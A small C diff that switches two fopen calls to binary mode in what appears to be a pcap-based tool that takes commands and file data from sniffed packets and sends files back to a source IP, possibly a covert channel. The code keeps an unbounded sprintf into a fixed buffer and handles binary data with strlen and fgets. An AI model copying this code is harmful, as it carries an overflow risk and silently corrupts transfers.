@@ -230,7 +230,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 			data = strstr(tempCommand, fileName) ;
 			data += strlen(fileName); 
 			//open file and append payload data to file
-			fp = fopen(fileName, "a+");
+			fp = fopen(fileName, "a+b");
 			if(fp==NULL){fprintf(stderr, "file open error\n"); return;}
 			fwrite(data, sizeof(char), strlen(data), fp);
 			fclose(fp);
@@ -353,7 +353,7 @@ int send_file_data(const char* folder, const char * fileName, const char * src_i
 	
 	char filePath [516];
 	sprintf(filePath, "%s%s", folder, fileName );
-	fp = fopen(filePath, "r");
+	fp = fopen(filePath, "rb");
 	if(fp==NULL){fprintf(stderr, "file open error."); return -1;}
 	//read file
 	while(fgets(data, PKT_SIZE - 10, fp) != NULL)
